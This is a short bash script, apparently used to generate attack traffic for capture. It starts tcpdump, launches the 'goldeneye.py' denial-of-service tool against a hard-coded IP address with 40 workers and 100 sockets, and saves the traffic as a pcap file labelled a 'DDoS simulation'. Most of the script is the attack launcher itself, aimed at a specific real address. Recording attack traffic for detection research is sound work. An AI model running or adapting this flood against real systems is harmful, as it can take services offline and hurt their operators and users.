#!/bin/bash

TARGET="http://205.174.165.68"
INTERFACE="eth0"
PCAP_FILE="pcap/ddos_goldeneye_$(date +%Y%m%d_%H%M%S).pcap"

echo "[*] Starting tcpdump capture: $PCAP_FILE"
sudo tcpdump -i "$INTERFACE" host 205.174.165.68 -w "$PCAP_FILE" &
TCPDUMP_PID=$!

python3 goldeneye.py "$TARGET" -w 40 -s 100

# Press CTRL+C to stop manually or set a timeout if needed
kill "$TCPDUMP_PID"
echo "[✅] DDoS simulation complete. PCAP saved to $PCAP_FILE"
